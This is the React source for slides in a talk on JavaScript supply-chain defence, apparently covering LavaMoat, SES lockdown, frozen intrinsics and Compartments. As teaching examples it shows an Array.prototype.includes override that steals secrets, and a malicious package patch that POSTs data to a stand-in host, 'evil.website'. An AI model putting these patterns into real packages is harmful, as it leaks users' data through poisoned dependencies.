import React from 'react';
import { Slide, CodePane, Markdown } from 'spectacle';
import ActionSlide from './action-slide'
import lavamoatConfig from './example-config.json'


// ignore this - to please the linter
function getRandomNumber () {}

const frozenPrimsCodeExamples = [
// `

//   // anyone can modify base functionality
//   Array.prototype.map = () => { /* ... */ }


// `,
`
const secrets = Array(3).fill().map(getRandomNumber)
function checkSecret (guess) {
  return secrets.includes(guess)
}
`,
// -
`
let checkSecret
{
  const secrets = Array(3).fill().map(getRandomNumber)
  checkSecret = (guess) => {
    return secrets.includes(guess)
  }
}

checkSecret(123)
`,
// 1
`
let checkSecret
{
  const secrets = Array(3).fill().map(getRandomNumber)
  let attempts = 0
  checkSecret = (guess) => {
    attempts++
    if (attempts > 3) throw new Error('No more guesses!')
    return secrets.includes(guess)
  }
}

// how to get secret??
checkSecret(123)
checkSecret(42)
checkSecret(19)
`,
// 2
`
let checkSecret
{
  const secrets = Array(3).fill().map(getRandomNumber)
  let attempts = 0
  checkSecret = (guess) => {
    attempts++
    if (attempts > 3) throw new Error('No more guesses!')
    return secrets.includes(guess)
  }
}

// answer: overwrite what "secrets.includes" does
let stolenSecrets
Array.prototype.includes = function () {
  stolenSecrets = this
}
checkSecret()
`,
]

export class FrozenPrimitivesExample extends React.Component {
  constructor (props) {
    super(props)
    this.state = {
      slideActionIndex: 0
    }
  }

  render () {
    const { slideActionIndex } = this.state
    return (
      <ActionSlide
        transition={['slide']}
        bgColor="primary"
        onSlideActionIndexChange={(slideActionIndex) => this.setState(() => ({ slideActionIndex }))}
        slideActionMax={frozenPrimsCodeExamples.length-1}
        >
        <CodePane
          lang="js"
          source={frozenPrimsCodeExamples[slideActionIndex]}
          textSize={26}
        />
      </ActionSlide>
    )
  }
}

export class FrozenPrimitivesFix extends React.Component {
  render () {
    const source = 
`
// SES-shim provides
lockdown()

// prevent modifications to intrinsics
Object.freeze(Object.prototype)
Object.freeze(Array.prototype)
// ...etc
`
    return (
      <Slide>
        <CodePane
          lang="js"
          source={source}
          textSize={40}
        />
      </Slide>
    )
  }
}


export class CompartmentExplainer extends React.Component {
  render () {
    const source = 
`
// this is almost a Compartment,
const vm = require('vm')
vm.runInContext(code, endowments)

// but this is a different Realm, so it suffers
// from "Identity Discontinuity"
Array !== vm.runInContext('Array')
`
    return (
      <Slide>
        <CodePane
          lang="js"
          source={source}
          textSize={26}
        />
      </Slide>
    )
  }
}

const explicitEndowmentsCodeExamples = [
`
const http = require('http')
const { PizzaValidator } from 'pizza-validator'

PizzaValidator.prototype.validate = (pizzaType, pizzaParameters) => {
  if (pizzaType === 'pineapple') {
    // send to evil lair
    fetch('evil.website', {
      method: 'POST',
      body: JSON.stringify(pizzaParameters),
    })
  }
  // validate pizza normally
}
`,
]


export class ExplicitEndowmentsExample extends React.Component {
  constructor (props) {
    super(props)
    this.state = {
      slideActionIndex: 0
    }
  }

  render () {
    const { slideActionIndex } = this.state
    return (
      <ActionSlide
        transition={['slide']}
        bgColor="primary"
        onSlideActionIndexChange={(slideActionIndex) => this.setState(() => ({ slideActionIndex }))}
        slideActionMax={explicitEndowmentsCodeExamples.length-1}
        >
        <CodePane
          lang="js"
          source={explicitEndowmentsCodeExamples[slideActionIndex]}
          textSize={26}
        />
      </ActionSlide>
    )
  }
}

const explicitEndowmentsFixCodeExamples = [
  // -
`
// block ambient authority with Compartments 
const compartment = new Compartment(endowments)
compartment.evaluate(code)
`,
  // -
`
// expose only explicit endowments to code
const compartment = new Compartment({ fetch, location })
compartment.evaluate(moduleSource)
`,
`
// unique globalThis per compartment
compartmentA.globalThis !== compartmentB.globalThis
// common intrinsics
Array === compartment.globalThis.Array
`,
`
// Compartment shim, simplified
with (new Proxy(endowmentsHandler)) {
  eval(code)
}
`,
// vm
`
// this is almost a Compartment,
const vm = require('vm')
vm.runInContext(code, endowments)

// but this is a different Realm, so it suffers
// from "Identity Discontinuity"
Array !== vm.runInContext('Array')
`
]

export class ExplicitEndowmentsFix extends React.Component {
  constructor (props) {
    super(props)
    this.state = {
      slideActionIndex: 0
    }
  }

  render () {
    const { slideActionIndex } = this.state
    return (
      <ActionSlide
        transition={['slide']}
        bgColor="primary"
        onSlideActionIndexChange={(slideActionIndex) => this.setState(() => ({ slideActionIndex }))}
        slideActionMax={explicitEndowmentsFixCodeExamples.length-1}
        >
        <CodePane
          lang="js"
          source={explicitEndowmentsFixCodeExamples[slideActionIndex]}
          textSize={26}
        />
      </ActionSlide>
    )
  }
}

const exampleConfg = `
"string_decoder": {
  "packages": {
    "safe-buffer": true
  }
},
"strip-hex-prefix": {
  "packages": {
    "is-hex-prefixed": true
  }
},
"through": {
  "packages": {
    "process": true,
    "stream-browserify": true
  }
},
`

export class ConfigExample extends React.Component {
  constructor (props) {
    super(props)
    this.state = {
      slideActionIndex: 0
    }
  }

  render () {
    // const { slideActionIndex } = this.state
    return (
      <Slide transition={['slide']} bgColor="primary">
        <CodePane
          lang="js"
          // source={JSON.stringify(lavamoatConfig, null, 2)}
          source={exampleConfg}
          textSize={20}
        />
      </Slide>
    )
  }
}

const lavamoatDiagram = 
`
     App              Package: abc            Package: xyz
   +--------------+ +---------------------+ +---------------------+
   |              | |                     | |                     |
   |              | |                     | |                     |
   |   index.js   | |  one.js     two.js  | |  one.js     two.js  |
   |  +--------+  | | +--------+ +-----+  | | +--------+ +-----+  |
   |  |        |  | | |        | |     |  | | |        | |     |  |
   |  |        |  | | |        | |     |  | | |        | |     |  |
   |  |        |  | | |        | |     |  | | |        | |     |  |
   |  +--------+  | | +--------+ +-----+  | | +--------+ +-----+  |
   |   require    | |  require            | | require             |
   +------+-------+ +---+-----------------+ +--+------------------+
          ^             ^                      ^
+--------------------------------------------------------------------+
          |             |                      |
   +------+-------------+----------------------+--+  +------------+
   |                                              |  |            |
   |            LavaMoat kernel                   +->+   policy   |
   |                                              |  |            |
   +----------------------------------------------+  +------------+
`

export class LavamoatDiagramSlide extends React.Component {  
  render () {
    return (
      <Slide transition={['slide']} bgColor="primary">
        <CodePane
          // lang="js"
          source={lavamoatDiagram}
          textSize={20}
        />
      </Slide>  
    )
  }
}


export class LavaMoatIntroSlide extends React.Component {
  render () {
    return (
      <Slide transition={['slide']} bgColor="primary">
        <CodePane
          lang="bash"
          source={`
          # previously
          node index.js
          # once: automatic policy generation
          lavamoat index.js --writeAutoPolicy
          # new
          lavamoat index.js
          `}
          textSize={20}
        />
      </Slide>
    )
  }
}